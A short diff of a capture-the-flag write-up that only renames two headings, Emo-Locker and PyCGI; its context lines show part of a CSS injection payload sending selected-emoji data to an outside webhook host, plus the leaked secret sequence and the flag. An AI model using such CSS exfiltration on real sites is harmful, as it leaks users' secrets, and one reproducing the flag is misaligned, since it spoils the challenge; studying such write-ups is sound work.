@@ -6,7 +6,7 @@ Team: Kalmarunionen
 
 Place: 7 (of 294)
 
-## Emo-Locker
+## Challenge: Emo-Locker
 
 > All new emoji-based authentication service. See if you can get the admin's emojis. 🥷
 
@@ -89,7 +89,7 @@ span[role="img"][aria-label="7"]:empty { background-image: url("https://webhook.
 And watch the requests coming in whenever an emoji is selected.
 The secret sequence is "51,32,73,34,85,126,17,158,79,50" (😔 🫢 😕🤫😧🙊🤩💬😯😌) which we can use to login ourself and get the flag: `bi0sctf{a34522e2009192570c840f931e4c3c0a}`
 
-## PyCGI
+## Challenge: PyCGI
 
 > Hope its working. Can you check?
 
